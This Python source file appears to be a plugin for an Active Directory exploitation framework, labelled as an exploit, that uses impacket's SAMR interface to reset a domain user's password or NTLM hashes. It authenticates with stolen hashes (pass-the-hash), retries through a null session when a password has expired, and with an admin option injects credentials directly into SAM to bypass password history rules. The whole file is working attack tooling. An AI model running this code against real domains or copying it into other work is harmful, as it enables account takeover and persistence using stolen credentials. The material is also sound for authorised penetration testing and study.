import argparse
import sys
from copy import copy
from getpass import getpass

from impacket.dcerpc.v5 import transport, samr

from plugins.AD import PluginAdExploitBase
from utils import output
from utils.consts import AllPluginTypes


class PluginADImpacketSmbPasswd(PluginAdExploitBase):
    display = "Smb password"
    alias = "imp_smb_pwd"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-d", "--domain", help="dc fqdn (dc01.test.lab)", required=True, dest="domain")
        parser.add_argument("-u", "--username", help="username", required=True, dest="username")
        parser.add_argument("-p", "--password", help="password", required=False, dest="password")
        parser.add_argument('--dc-ip', action='store', metavar='ip address',
                            help="IP Address of the domain controller. If ")

        parser.add_argument('--ts', action='store_true', help='adds timestamp to every logging output')

        group = parser.add_mutually_exclusive_group()
        group.add_argument('--newpass', action='store', default=False, help='new SMB password')
        group.add_argument('--newhashes', action='store', default=None, metavar='LMHASH:NTHASH',
                           help='new NTLM hashes, format is LMHASH:NTHASH '
                                '(the user will be asked to change their password at next logon)')

        group = parser.add_argument_group('authentication')
        group.add_argument('--hashes', action='store', default=None, metavar='LMHASH:NTHASH',
                           help='NTLM hashes, format is LMHASH:NTHASH')

        group = parser.add_argument_group('RPC authentication')
        group.add_argument('--altuser', action='store', default=None, help='alternative username')
        group.add_argument('--altpass', action='store', default=None, help='alternative password')
        group.add_argument('--althash', action='store', default=None, help='alternative NT hash')

        group = parser.add_argument_group('set credentials method')
        group.add_argument('--admin', action='store_true',
                           help='injects credentials into SAM (requires admin\'s priveleges on a machine, '
                                'but can bypass password history policy)')

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        _domain_fqdn: str = args.domain
        domain = ".".join(_domain_fqdn.split(".")[-2:])
        username, oldPassword, address = args.username, args.password, args.dc_ip

        if domain is None:
            domain = 'Builtin'

        if args.hashes is not None:
            try:
                oldPwdHashLM, oldPwdHashNT = args.hashes.split(':')
            except ValueError:
                output.error('Wrong hashes string format. For more information run with --help option.')
                return result
        else:
            oldPwdHashLM = ''
            oldPwdHashNT = ''

        if oldPassword == '' and oldPwdHashNT == '' and not args.admin:
            oldPassword = getpass('Current SMB password: ')

        if args.newhashes is not None:
            try:
                newPwdHashLM, newPwdHashNT = args.newhashes.split(':')
            except ValueError:
                output.error('Wrong new hashes string format. For more information run with --help option.')
                return result
            newPassword = ''
        else:
            newPwdHashLM = ''
            newPwdHashNT = ''
            if args.newpass is None:
                newPassword = getpass('New SMB password: ')
                if newPassword != getpass('Retype new SMB password: '):
                    output.error('Passwords do not match, try again.')
                    sys.exit(1)
            else:
                newPassword = args.newpass

        smbpasswd = SMBPasswd(address, domain, username, oldPassword, newPassword, oldPwdHashLM, oldPwdHashNT,
                              newPwdHashLM, newPwdHashNT)

        if args.altuser is not None:
            try:
                altDomain, altUsername = args.altuser.split('/')
            except ValueError:
                altDomain = domain
                altUsername = args.altuser

            if args.altpass is not None and args.althash is None:
                altPassword = args.altpass
                altNTHash = ''
            elif args.altpass is None and args.althash is not None:
                altPassword = ''
                altNTHash = args.althash
            elif args.altpass is None and args.althash is None:
                output.error('Please, provide either alternative password or NT hash for RPC authentication.')
                return result
            else:  # if args.altpass is not None and args.althash is not None
                output.error('Argument -altpass not allowed with argument -althash.')
                return result
        else:
            altUsername = ''

        try:
            if altUsername == '':
                smbpasswd.connect()
            else:
                output.debug('Using {}\\{} credentials to connect to RPC.'.format(altDomain, altUsername))
                smbpasswd.connect(altDomain, altUsername, altPassword, altNTHash)
        except Exception as e:
            if any(msg in str(e) for msg in ['STATUS_PASSWORD_MUST_CHANGE', 'STATUS_PASSWORD_EXPIRED']):
                if newPassword:
                    output.warning('Password is expired, trying to bind with a null session.')
                    smbpasswd.connect(anonymous=True)
                else:
                    output.error(
                        'Cannot set new NTLM hashes when current password is expired. Provide a plaintext value for the new password.')
                    sys.exit(1)
            elif 'STATUS_LOGON_FAILURE' in str(e):
                output.error('Authentication failure.')
                return result
            else:
                raise e

        if args.admin:
            # Inject credentials into SAM (requires admin's privileges)
            smbpasswd.hSamrSetInformationUser()
        else:
            if newPassword:
                # If using a plaintext value for the new password
                smbpasswd.hSamrUnicodeChangePasswordUser2()
            else:
                # If using NTLM hashes for the new password
                smbpasswd.hSamrChangePasswordUser()

        return result


class SMBPasswd:

    def __init__(self, address, domain='', username='', oldPassword='', newPassword='', oldPwdHashLM='',
                 oldPwdHashNT='', newPwdHashLM='', newPwdHashNT=''):
        self.address = address
        self.domain = domain
        self.username = username
        self.oldPassword = oldPassword
        self.newPassword = newPassword
        self.oldPwdHashLM = oldPwdHashLM
        self.oldPwdHashNT = oldPwdHashNT
        self.newPwdHashLM = newPwdHashLM
        self.newPwdHashNT = newPwdHashNT
        self.dce = None

    def connect(self, domain='', username='', password='', nthash='', anonymous=False):
        rpctransport = transport.SMBTransport(self.address, filename=r'\samr')
        if anonymous:
            rpctransport.set_credentials(username='', password='', domain='', lmhash='', nthash='', aesKey='')
        elif username != '':
            lmhash = ''
            rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey='')
        else:
            rpctransport.set_credentials(self.username, self.oldPassword, self.domain, self.oldPwdHashLM,
                                         self.oldPwdHashNT, aesKey='')

        self.dce = rpctransport.get_dce_rpc()
        self.dce.connect()
        self.dce.bind(samr.MSRPC_UUID_SAMR)

    def hSamrUnicodeChangePasswordUser2(self):
        try:
            resp = samr.hSamrUnicodeChangePasswordUser2(self.dce, '\x00', self.username, self.oldPassword,
                                                        self.newPassword, self.oldPwdHashLM, self.oldPwdHashNT)
        except Exception as e:
            if 'STATUS_PASSWORD_RESTRICTION' in str(e):
                output.error(
                    'Some password update rule has been violated. For example, the password may not meet length criteria.')
            else:
                raise e
        else:
            if resp['ErrorCode'] == 0:
                output.info('Password was changed successfully.')
            else:
                output.error('Non-zero return code, something weird happened.')
                resp.dump()

    def hSamrChangePasswordUser(self):
        try:
            serverHandle = samr.hSamrConnect(self.dce, self.address + '\x00')['ServerHandle']
            domainSID = samr.hSamrLookupDomainInSamServer(self.dce, serverHandle, self.domain)['DomainId']
            domainHandle = samr.hSamrOpenDomain(self.dce, serverHandle, domainId=domainSID)['DomainHandle']
            userRID = samr.hSamrLookupNamesInDomain(self.dce, domainHandle, (self.username,))['RelativeIds']['Element'][
                0]
            userHandle = samr.hSamrOpenUser(self.dce, domainHandle, userId=userRID)['UserHandle']
        except Exception as e:
            if 'STATUS_NO_SUCH_DOMAIN' in str(e):
                output.error(
                    'Wrong realm. Try to set the domain name for the target user account explicitly in format DOMAIN/username.')
                return
            else:
                raise e

        try:
            resp = samr.hSamrChangePasswordUser(self.dce, userHandle, self.oldPassword, newPassword='',
                                                oldPwdHashNT=self.oldPwdHashNT,
                                                newPwdHashLM=self.newPwdHashLM, newPwdHashNT=self.newPwdHashNT)
        except Exception as e:
            if 'STATUS_PASSWORD_RESTRICTION' in str(e):
                output.error(
                    'Some password update rule has been violated. For example, the password history policy may prohibit the use of recent passwords.')
            else:
                raise e
        else:
            if resp['ErrorCode'] == 0:
                output.info('NTLM hashes were changed successfully.')
            else:
                output.error('Non-zero return code, something weird happened.')
                resp.dump()

    def hSamrSetInformationUser(self):
        try:
            serverHandle = samr.hSamrConnect(self.dce, self.address + '\x00')['ServerHandle']
            domainSID = samr.hSamrLookupDomainInSamServer(self.dce, serverHandle, self.domain)['DomainId']
            domainHandle = samr.hSamrOpenDomain(self.dce, serverHandle, domainId=domainSID)['DomainHandle']
            userRID = samr.hSamrLookupNamesInDomain(self.dce, domainHandle, (self.username,))['RelativeIds']['Element'][
                0]
            userHandle = samr.hSamrOpenUser(self.dce, domainHandle, userId=userRID)['UserHandle']
        except Exception as e:
            if 'STATUS_NO_SUCH_DOMAIN' in str(e):
                output.error(
                    'Wrong realm. Try to set the domain name for the target user account explicitly in format DOMAIN/username.')
                return
            else:
                raise e
        try:
            resp = samr.hSamrSetNTInternal1(self.dce, userHandle, self.newPassword, self.newPwdHashNT)
        except Exception as e:
            raise e
        else:
            if resp['ErrorCode'] == 0:
                output.info('Credentials were injected into SAM successfully.')
            else:
                output.error('Non-zero return code, something weird happened.')
                resp.dump()
